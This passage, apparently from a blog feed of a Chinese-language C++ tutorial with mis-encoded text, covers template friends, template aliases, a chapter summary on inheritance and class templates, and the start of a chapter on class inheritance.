T&gt; <span class="class"><span class="keyword">class</span> <span class="title">Target</span>;</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="function"><span class="keyword">void</span> <span class="title">friend_func</span><span class="params">(<span class="keyword">const</span> Target&lt;T&gt; &amp;)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Target</span> &#123;</span></span><br><span class="line">    <span class="comment">// friend_func&lt;T&gt; æ˜¯ Target&lt;T&gt; çš„å‹å…ƒ</span></span><br><span class="line">    <span class="keyword">friend</span> <span class="keyword">void</span> friend_func&lt;T&gt;(<span class="keyword">const</span> Target&lt;T&gt; &amp;);</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    T data;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">friend_func</span><span class="params">(<span class="keyword">const</span> Target&lt;T&gt; &amp; t)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; t.data; <span class="comment">// å¯ä»¥è®¿é—® Target&lt;T&gt; çš„ç§æœ‰æˆå‘˜</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> è¿™é‡Œï¼Œ<code>friend_func&lt;int&gt;</code> æ˜¯ <code>Target&lt;int&gt;</code> çš„å‹å…ƒï¼Œ<code>friend_func&lt;double&gt;</code> æ˜¯ <code>Target&lt;double&gt;</code> çš„å‹å…ƒï¼Œä½† <code>friend_func&lt;int&gt;</code> ä¸æ˜¯ <code>Target&lt;double&gt;</code> çš„å‹å…ƒã€‚</p></li><li><p><strong>éçº¦æŸæ¨¡æ¿å‹å…ƒå‡½æ•°/ç±» (Unbound Template Friend):</strong> æ¨¡æ¿å‡½æ•°/ç±»çš„<strong>æ‰€æœ‰</strong>å®ä¾‹åŒ–éƒ½æ˜¯æ¨¡æ¿ç±»çš„<strong>æ‰€æœ‰</strong>å®ä¾‹åŒ–çš„å‹å…ƒã€‚å³ä»»ä½• <code>Friend&lt;U&gt;</code> éƒ½æ˜¯ä»»ä½• <code>Target&lt;T&gt;</code> çš„å‹å…ƒã€‚</p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnotherTarget</span> &#123;</span></span><br><span class="line">    <span class="comment">// å£°æ˜æ¨¡æ¿å‡½æ•° show_data ä¸ºå‹å…ƒ</span></span><br><span class="line">    <span class="keyword">template</span> &lt;<span class="keyword">typename</span> U&gt; <span class="comment">// æ¨¡æ¿å‚æ•° U å¯ä»¥ä¸ T ä¸åŒ</span></span><br><span class="line">    <span class="function"><span class="keyword">friend</span> <span class="keyword">void</span> <span class="title">show_data</span><span class="params">(<span class="keyword">const</span> AnotherTarget&lt;U&gt; &amp;)</span></span>;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    T data;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> U&gt;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show_data</span><span class="params">(<span class="keyword">const</span> AnotherTarget&lt;U&gt; &amp; at)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; at.data; <span class="comment">// å¯ä»¥è®¿é—®ä»»ä½• AnotherTarget&lt;U&gt; å®ä¾‹çš„ç§æœ‰æˆå‘˜</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä½¿ç”¨</span></span><br><span class="line"><span class="function">AnotherTarget&lt;<span class="keyword">int</span>&gt; <span class="title">ati</span><span class="params">(<span class="number">10</span>)</span></span>;</span><br><span class="line"><span class="function">AnotherTarget&lt;<span class="keyword">double</span>&gt; <span class="title">atd</span><span class="params">(<span class="number">3.14</span>)</span></span>;</span><br><span class="line"><span class="comment">// show_data&lt;int&gt;(ati); // OK</span></span><br><span class="line"><span class="comment">// show_data&lt;double&gt;(atd); // OK</span></span><br><span class="line"><span class="comment">// show_data&lt;int&gt;(atd); // ä¹Ÿèƒ½è®¿é—® atd.dataï¼Œå› ä¸º show_data&lt;int&gt; æ˜¯æ‰€æœ‰ AnotherTarget çš„å‹å…ƒ</span></span><br></pre></td></tr></table></figure><p> éçº¦æŸå‹å…ƒæä¾›äº†æœ€å¤§çš„è®¿é—®æƒé™ï¼Œä½†ä¹Ÿå¯èƒ½ç ´åå°è£…ï¼Œéœ€è¦è°¨æ…ä½¿ç”¨ã€‚</p></li></ol><h3 id="14-4-10-æ¨¡æ¿åˆ«åï¼ˆC-11ï¼‰"><a href="#14-4-10-æ¨¡æ¿åˆ«åï¼ˆC-11ï¼‰" class="headerlink" title="14.4.10 æ¨¡æ¿åˆ«åï¼ˆC++11ï¼‰"></a>14.4.10 æ¨¡æ¿åˆ«åï¼ˆC++11ï¼‰</h3><p>C++11 å¼•å…¥äº† <code>using</code> å…³é”®å­—ï¼ˆä¹‹å‰ä¸»è¦ç”¨äº <code>using</code> å£°æ˜å’Œ <code>using</code> æŒ‡ä»¤ï¼‰æ¥åˆ›å»º**æ¨¡æ¿åˆ«å (Template Aliases)**ï¼Œä½¿å¾—ä½¿ç”¨å¤æ‚çš„æ¨¡æ¿ç±»å‹æ›´åŠ æ–¹ä¾¿ã€‚</p><p><strong>è¯­æ³•:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ä¸ºç‰¹å®šå®ä¾‹åŒ–åˆ›å»ºåˆ«å</span></span><br><span class="line"><span class="keyword">using</span> AliasName = ExistingTemplate&lt;ConcreteType&gt;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä¸ºæ¨¡æ¿æœ¬èº«åˆ›å»ºåˆ«å (å‚æ•°åŒ–çš„åˆ«å)</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="keyword">using</span> AliasTemplateName = ExistingTemplate&lt;T, SomeFixedType, ...&gt;;</span><br></pre></td></tr></table></figure><p><strong>ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;array&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ä¸ºç‰¹å®šå®ä¾‹åŒ–åˆ›å»ºåˆ«å</span></span><br><span class="line"><span class="keyword">using</span> IntVec = <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;;</span><br><span class="line"><span class="keyword">using</span> StringArray10 = <span class="built_in">std</span>::<span class="built_in">array</span>&lt;<span class="built_in">std</span>::<span class="built_in">string</span>, <span class="number">10</span>&gt;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä¸ºæ¨¡æ¿åˆ›å»ºåˆ«å</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="keyword">using</span> Vec = <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;T&gt;; <span class="comment">// Vec&lt;T&gt; ç­‰ä»·äº std::vector&lt;T&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="keyword">using</span> Array12 = <span class="built_in">std</span>::<span class="built_in">array</span>&lt;T, <span class="number">12</span>&gt;; <span class="comment">// Array12&lt;T&gt; ç­‰ä»·äº std::array&lt;T, 12&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    IntVec numbers; <span class="comment">// numbers æ˜¯ std::vector&lt;int&gt;</span></span><br><span class="line">    numbers.push_back(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    StringArray10 names; <span class="comment">// names æ˜¯ std::array&lt;std::string, 10&gt;</span></span><br><span class="line">    names[<span class="number">0</span>] = <span class="string">&quot;Alice&quot;</span>;</span><br><span class="line"></span><br><span class="line">    Vec&lt;<span class="keyword">double</span>&gt; doubles; <span class="comment">// doubles æ˜¯ std::vector&lt;double&gt;</span></span><br><span class="line">    doubles.push_back(<span class="number">3.14</span>);</span><br><span class="line"></span><br><span class="line">    Array12&lt;<span class="keyword">char</span>&gt; chars; <span class="comment">// chars æ˜¯ std::array&lt;char, 12&gt;</span></span><br><span class="line">    chars[<span class="number">0</span>] = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¨¡æ¿åˆ«åæ¯”ä¼ ç»Ÿçš„ <code>typedef</code> æ›´å¼ºå¤§ï¼Œå› ä¸º <code>typedef</code> ä¸èƒ½ç›´æ¥ä¸ºæ¨¡æ¿åˆ›å»ºåˆ«åï¼ˆåªèƒ½ä¸ºå®Œå…¨å®ä¾‹åŒ–çš„ç±»å‹åˆ›å»ºåˆ«åï¼‰ã€‚æ¨¡æ¿åˆ«åæé«˜äº†ä»£ç çš„å¯è¯»æ€§å’Œæ˜“ç”¨æ€§ã€‚</p><h2 id="14-5-æ€»ç»“"><a href="#14-5-æ€»ç»“" class="headerlink" title="14.5 æ€»ç»“"></a>14.5 æ€»ç»“</h2><p>æœ¬ç« æ¢è®¨äº† C++ ä¸­é™¤äº†å…¬æœ‰ç»§æ‰¿ä¹‹å¤–çš„å…¶ä»–ä»£ç é‡ç”¨æŠ€æœ¯ï¼ŒåŒ…æ‹¬åŒ…å«ï¼ˆç»„åˆï¼‰ã€ç§æœ‰ç»§æ‰¿ã€ä¿æŠ¤ç»§æ‰¿ã€å¤šé‡ç»§æ‰¿ä»¥åŠå¼ºå¤§çš„ç±»æ¨¡æ¿ã€‚è¿™äº›æŠ€æœ¯æä¾›äº†ä¸åŒçš„æ–¹å¼æ¥å»ºç«‹ç±»ä¹‹é—´çš„å…³ç³»å’Œåˆ›å»ºå¯é‡ç”¨çš„é€šç”¨ä»£ç ã€‚</p><p>ä¸»è¦å†…å®¹å›é¡¾ï¼š</p><ol><li><p><strong>åŒ…å«/ç»„åˆ (Composition):</strong></p><ul><li>  é€šè¿‡å°†ä¸€ä¸ªç±»çš„å¯¹è±¡ä½œä¸ºå¦ä¸€ä¸ªç±»çš„æˆå‘˜æ¥å®ç°ï¼Œæ¨¡æ‹Ÿ <strong>â€œhas-aâ€</strong> å…³ç³»ã€‚</li><li>  æ˜¯ä»£ç é‡ç”¨çš„å¸¸ç”¨ä¸”æ¨èçš„æ–¹å¼ï¼Œç‰¹åˆ«æ˜¯å½“æˆå‘˜å¯¹è±¡èƒ½è‡ªæˆ‘ç®¡ç†èµ„æºæ—¶ï¼ˆéµå¾ªé›¶æ³•åˆ™ï¼‰ã€‚</li><li>  åŒ…å«ç±»çš„æ„é€ å‡½æ•°ä½¿ç”¨æˆå‘˜åˆå§‹åŒ–åˆ—è¡¨æ¥åˆå§‹åŒ–æˆå‘˜å¯¹è±¡ã€‚</li><li>  ä¾‹å¦‚ï¼Œ<code>Student</code> ç±»åŒ…å« <code>std::string</code> å’Œ <code>std::valarray&lt;double&gt;</code> æˆå‘˜ã€‚</li></ul></li><li><p><strong>ç§æœ‰ç»§æ‰¿ (<code>private</code>):</strong></p><ul><li>  æ¨¡æ‹Ÿ <strong>â€œis-implemented-in-terms-ofâ€</strong> å…³ç³»ï¼Œç»§æ‰¿å®ç°ä½†ä¸ç»§æ‰¿æ¥å£ã€‚</li><li>  åŸºç±»çš„å…¬æœ‰å’Œä¿æŠ¤æˆå‘˜åœ¨æ´¾ç”Ÿç±»ä¸­å˜ä¸ºç§æœ‰ã€‚</li><li>  é€šå¸¸ä¸å¦‚åŒ…å«ç›´è§‚å’Œçµæ´»ï¼Œä½†å¯ç”¨äºè®¿é—®åŸºç±»çš„ä¿æŠ¤æˆå‘˜æˆ–è¦†ç›–è™šå‡½æ•°ï¼ˆè™½ç„¶è®¿é—®æƒé™å˜ä¸ºç§æœ‰ï¼‰ã€‚</li><li>  æ´¾ç”Ÿç±»éœ€è¦æä¾›è‡ªå·±çš„æ¥å£æ¥æš´éœ²æ‰€éœ€åŠŸèƒ½ï¼Œå†…éƒ¨è®¿é—®åŸºç±»æˆå‘˜é€šå¸¸éœ€è¦ç±»å‹è½¬æ¢ã€‚</li></ul></li><li><p><strong>ä¿æŠ¤ç»§æ‰¿ (<code>protected</code>):</strong></p><ul><li>  åŸºç±»çš„å…¬æœ‰å’Œä¿æŠ¤æˆå‘˜åœ¨æ´¾ç”Ÿç±»ä¸­å˜ä¸ºä¿æŠ¤ã€‚</li><li>  ä¸ç§æœ‰ç»§æ‰¿ç±»ä¼¼ï¼Œç»§æ‰¿å®ç°ä½†ä¸ç»§æ‰¿æ¥å£ã€‚</li><li>  å…è®¸åç»­çš„æ´¾ç”Ÿç±»è®¿é—®ç»§æ‰¿æ¥çš„ï¼ˆç°åœ¨æ˜¯ä¿æŠ¤çš„ï¼‰æˆå‘˜ã€‚</li><li>  ä½¿ç”¨åœºæ™¯éå¸¸æœ‰é™ã€‚</li></ul></li><li><p> <strong>åŒ…å« vs. ç§æœ‰ç»§æ‰¿:</strong> å¯¹äº â€œhas-aâ€ å…³ç³»ï¼Œ**ä¼˜å…ˆé€‰æ‹©åŒ…å« (ç»„åˆ)**ï¼Œå› ä¸ºå®ƒæ›´ç®€å•ã€æ¸…æ™°ã€çµæ´»ã€‚</p></li><li><p> <strong><code>using</code> å£°æ˜ä¸ç»§æ‰¿:</strong> åœ¨ç§æœ‰æˆ–ä¿æŠ¤ç»§æ‰¿ä¸‹ï¼Œå¯ä»¥ä½¿ç”¨ <code>using Base::member;</code> åœ¨æ´¾ç”Ÿç±»ä¸­æ¢å¤åŸºç±»æŸä¸ªæˆå‘˜çš„å¯è®¿é—®æ€§ï¼ˆé€šå¸¸æå‡åˆ° <code>public</code> æˆ– <code>protected</code>ï¼‰ã€‚</p></li><li><p><strong>å¤šé‡ç»§æ‰¿ (MI):</strong></p><ul><li>  å…è®¸ä¸€ä¸ªç±»ä»å¤šä¸ªåŸºç±»ç»§æ‰¿ã€‚</li><li>  å¯èƒ½å¯¼è‡´<strong>æ­§ä¹‰</strong>ï¼ˆæˆå‘˜åå†²çªï¼‰å’Œ<strong>é’»çŸ³é—®é¢˜</strong>ï¼ˆå…±åŒåŸºç±»çš„å¤šå‰¯æœ¬ï¼‰ã€‚</li><li>  åç§°å†²çªé€šè¿‡ä½œç”¨åŸŸè§£æè¿ç®—ç¬¦ (<code>::</code>) è§£å†³ã€‚</li><li>  é’»çŸ³é—®é¢˜é€šè¿‡<strong>è™šåŸºç±» (<code>virtual public Base</code>)</strong> è§£å†³ï¼Œç¡®ä¿å…±äº«åŸºç±»çš„å•ä¸€å‰¯æœ¬ï¼Œä½†æ„é€ å‡½æ•°å®ç°æ›´å¤æ‚ã€‚</li><li>  åº”è°¨æ…ä½¿ç”¨ï¼Œä¼˜å…ˆè€ƒè™‘ç»„åˆæˆ–å•ç»§æ‰¿ã€‚</li></ul></li><li><p><strong>ç±»æ¨¡æ¿:</strong></p><ul><li>  å…è®¸åˆ›å»ºå‚æ•°åŒ–çš„ç±»è“å›¾ï¼Œç”¨äºç”Ÿæˆå¤„ç†ä¸åŒç±»å‹çš„ç±»ã€‚</li><li>  ä½¿ç”¨ <code>template &lt;typename T, ...&gt;</code> å®šä¹‰ã€‚</li><li>  é€šè¿‡æä¾›å…·ä½“ç±»å‹æ¥<strong>å®ä¾‹åŒ–</strong>æ¨¡æ¿ç±»ï¼Œå¦‚ <code>Stack&lt;int&gt;</code>ã€‚</li><li>  æ¨¡æ¿å®ç°é€šå¸¸æ”¾åœ¨å¤´æ–‡ä»¶ä¸­ã€‚</li><li>  å¯ä»¥æœ‰<strong>éç±»å‹å‚æ•°</strong>ï¼ˆå¦‚ <code>template &lt;typename T, int N&gt;</code>ï¼‰ï¼Œç”¨äºåœ¨ç¼–è¯‘æ—¶ç¡®å®šå¸¸é‡å€¼ï¼ˆå¦‚æ•°ç»„å¤§å°ï¼‰ã€‚</li><li>  <strong>æ¨¡æ¿å…·ä½“åŒ–</strong>ï¼ˆæ˜¾å¼å’Œéƒ¨åˆ†ï¼‰å…è®¸ä¸ºç‰¹å®šç±»å‹æä¾›ä¸“é—¨çš„å®ç°ã€‚</li><li>  ç±»å¯ä»¥åŒ…å«<strong>æˆå‘˜æ¨¡æ¿</strong>ï¼ˆæ¨¡æ¿åŒ–çš„æˆå‘˜å‡½æ•°æˆ–åµŒå¥—ç±»ï¼‰ã€‚</li><li>  æ¨¡æ¿å¯ä»¥ä½œä¸ºå…¶ä»–æ¨¡æ¿çš„å‚æ•°ï¼ˆ<strong>æ¨¡æ¿æ¨¡æ¿å‚æ•°</strong>ï¼‰ã€‚</li><li>  æ¨¡æ¿å¯ä»¥ä¸<strong>å‹å…ƒ</strong>ç»“åˆï¼Œæœ‰çº¦æŸå’Œéçº¦æŸä¸¤ç§å½¢å¼ã€‚</li><li>  C++11 å¼•å…¥äº†**æ¨¡æ¿åˆ«å (<code>using Alias = ...</code>)**ï¼Œç®€åŒ–å¤æ‚æ¨¡æ¿ç±»å‹çš„ä½¿ç”¨ã€‚</li></ul></li></ol><p>æœ¬ç« ä»‹ç»çš„æŠ€æœ¯æå¤§åœ°æ‰©å±•äº† C++ ä»£ç é‡ç”¨çš„å¯èƒ½æ€§ï¼Œä»ç®€å•çš„å¯¹è±¡ç»„åˆåˆ°å¤æ‚çš„ç»§æ‰¿å±‚æ¬¡ç»“æ„å’Œå¼ºå¤§çš„æ³›å‹ç¼–ç¨‹å·¥å…·â€”â€”ç±»æ¨¡æ¿ã€‚ç†è§£è¿™äº›æŠ€æœ¯åŠå…¶é€‚ç”¨åœºæ™¯å¯¹äºè®¾è®¡çµæ´»ã€å¯ç»´æŠ¤å’Œå¯é‡ç”¨çš„ C++ ä»£ç è‡³å…³é‡è¦ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Chapter 13 ç±»ç»§æ‰¿</title>
      <link href="2025/04/30/Cpp_tutorial_Chapter_13/"/>
      <url>2025/04/30/Cpp_tutorial_Chapter_13/</url>
      
        <content type="html"><![CDATA[<h2 id="13-1-ä¸€ä¸ªç®€å•çš„åŸºç±»"><a href="#13-1-ä¸€ä¸ªç®€å•çš„åŸºç±»" class="headerlink" title="13.1 ä¸€ä¸ªç®€å•çš„åŸºç±»"></a>13.1 ä¸€ä¸ªç®€å•çš„åŸºç±»</h2><p>é¢å‘å¯¹è±¡ç¼–ç¨‹ (OOP) çš„ä¸€ä¸ªæ ¸å¿ƒä¼˜åŠ¿æ˜¯<strong>ä»£ç é‡ç”¨</strong>ã€‚é™¤äº†é€šè¿‡åŒ…å«å¯¹è±¡æˆå‘˜ï¼ˆç»„åˆï¼‰ä¹‹å¤–ï¼ŒC++ è¿˜æä¾›äº†å¦ä¸€ç§å¼ºå¤§çš„ä»£ç é‡ç”¨æœºåˆ¶ï¼š**ç»§æ‰¿ (Inheritance)**ã€‚</p><p>ç»§æ‰¿å…è®¸æˆ‘ä»¬åŸºäºä¸€ä¸ªå·²æœ‰çš„ç±»ï¼ˆç§°ä¸º<strong>åŸºç±» (Base Class)</strong> æˆ–<strong>çˆ¶ç±» (Parent Class)**ï¼‰æ¥åˆ›å»ºä¸€ä¸ªæ–°çš„ç±»ï¼ˆç§°ä¸º</strong>æ´¾ç”Ÿç±» (Derived Class)** æˆ–**å­ç±» (Child Class)**ï¼‰ã€‚æ´¾ç”Ÿç±»ä¼šè‡ªåŠ¨è·å¾—åŸºç±»çš„æ‰€æœ‰æˆå‘˜ï¼ˆæ•°æ®å’Œå‡½æ•°ï¼‰ï¼Œå¹¶ä¸”å¯ä»¥æ·»åŠ è‡ªå·±çš„æ–°æˆå‘˜æˆ–ä¿®æ”¹ç»§æ‰¿æ¥çš„æˆå‘˜çš„è¡Œä¸ºã€‚</p><p>è¿™ç§æœºåˆ¶éå¸¸é€‚åˆç”¨æ¥è¡¨ç¤ºç°å®ä¸–ç•Œä¸­çš„â€œis-aâ€ï¼ˆæ˜¯ä¸€ç§ï¼‰å…³ç³»ã€‚ä¾‹å¦‚ï¼Œä¸€ä¸ªâ€œç»ç†â€<strong>æ˜¯</strong>ä¸€ä¸ªâ€œå‘˜å·¥â€ï¼Œä¸€ä¸ªâ€œåœ†â€<strong>æ˜¯</strong>ä¸€ä¸ªâ€œå½¢çŠ¶â€ã€‚</p><p>æœ¬èŠ‚æˆ‘ä»¬å°†ä»å®šä¹‰ä¸€ä¸ªç®€å•çš„åŸºç±»å¼€å§‹ï¼Œç„¶åæ¼”ç¤ºå¦‚ä½•ä»ä¸­æ´¾ç”Ÿå‡ºæ–°çš„ç±»ã€‚</p><p><strong>åœºæ™¯:</strong> å‡è®¾æˆ‘ä»¬è¦ä¸ºä¸€ä¸ªä¹’ä¹“çƒä¿±ä¹éƒ¨ç¼–å†™ç¨‹åºï¼Œéœ€è¦è¡¨ç¤ºçƒå‘˜ä¿¡æ¯ã€‚</p><p><strong>åŸºç±» <code>TableTennisPlayer</code>:</strong></p><p>æˆ‘ä»¬é¦–å…ˆåˆ›å»ºä¸€ä¸ªåŸºç¡€çš„ <code>TableTennisPlayer</code> ç±»ï¼ŒåŒ…å«çƒå‘˜çš„å§“åå’Œæ˜¯å¦æœ‰çƒæ¡Œã€‚</p><p><strong>tabtenn0.h (åŸºç±»å®šä¹‰)</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> TABTENN0_H_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TABTENN0_H_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ç®€å•çš„åŸºç±»</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TableTennisPlayer</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> firstname;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> lastname;</span><br><span class="line">    <span class="keyword">bool</span> hasTable;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// æ„é€ å‡½æ•°</span></span><br><span class="line">    TableTennisPlayer (<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp; fn = <span class="string">&quot;none&quot;</span>,</span><br><span class="line">                       <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp; ln = <span class="string">&quot;none&quot;</span>,</span><br><span class="line">                       <span class="keyword">bool</span> ht = <span class="literal">false</span>);</span><br><span class="line">    <span class="comment">// æ–¹æ³•</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Name</span><span class="params">()</span> <span class="keyword">const</span></span>; <span class="comment">// æ˜¾ç¤ºå§“å</span></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">HasTable</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> hasTable; &#125;; <span class="comment">// æ˜¯å¦æœ‰çƒæ¡Œ</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">ResetTable</span><span class="params">(<span class="keyword">bool</span> v)</span> </span>&#123; hasTable = v; &#125;; <span class="comment">// é‡ç½®çƒæ¡ŒçŠ¶æ€</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">// TABTENN0_H_</span></span></span><br></pre></td></tr></table></figure><p><strong>tabtenn0.cpp (åŸºç±»å®ç°)</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;tabtenn0.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line">TableTennisPlayer::TableTennisPlayer (<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp; fn,</span><br><span class="line">                                      <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp; ln, <span class="keyword">bool</span> ht)</span><br><span class="line">                                      : firstname(fn), lastname(ln), hasTable(ht) &#123;&#125; <span class="comment">// ä½¿ç”¨æˆå‘˜åˆå§‹åŒ–åˆ—è¡¨</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">TableTennisPlayer::Name</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; lastname &lt;&lt; <span class="string">&quot;, &quot;</span> &lt;&lt; firstname;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªåŸºç±»å¾ˆç®€å•ï¼ŒåŒ…å«äº†çƒå‘˜çš„åŸºæœ¬ä¿¡æ¯å’Œæ“ä½œã€‚</p><h3 id="13-1-1-æ´¾ç”Ÿä¸€ä¸ªç±»"><a href="#13-1-1-æ´¾ç”Ÿä¸€ä¸ªç±»" class="headerlink" title="13.1.1 æ´¾ç”Ÿä¸€ä¸ªç±»"></a>13.1.1 æ´¾ç”Ÿä¸€ä¸ªç±»</h3><p>ç°åœ¨ï¼Œå‡è®¾æˆ‘ä»¬æƒ³ä¸ºä¸€éƒ¨åˆ†çƒå‘˜æ·»åŠ â€œç§¯åˆ†â€ä¿¡æ¯ã€‚æˆ‘ä»¬å¯ä»¥ä» <code>TableTennisPlayer</code> æ´¾ç”Ÿå‡ºä¸€ä¸ªæ–°çš„ç±» <code>RatedPlayer</code>ï¼Œå®ƒå°†ç»§æ‰¿ <code>TableTennisPlayer</code> çš„æ‰€æœ‰æˆå‘˜ï¼Œå¹¶æ·»åŠ è‡ªå·±çš„ç§¯åˆ†æˆå‘˜å’Œç›¸å…³æ–¹æ³•ã€‚</p><p><strong>ç»§æ‰¿è¯­æ³•:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DerivedClassName</span> :</span> accessSpecifier BaseClassName &#123;</span><br><span class="line">    <span class="comment">// ... æ´¾ç”Ÿç±»æ–°å¢çš„æˆå‘˜ ...</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>  <code>DerivedClassName</code>: æ´¾ç”Ÿç±»çš„åç§°ã€‚</li><li>  <code>:</code>: è¡¨ç¤ºç»§æ‰¿å…³ç³»ã€‚</li><li>  <code>accessSpecifier</code>: è®¿é—®è¯´æ˜ç¬¦ï¼ˆé€šå¸¸æ˜¯ 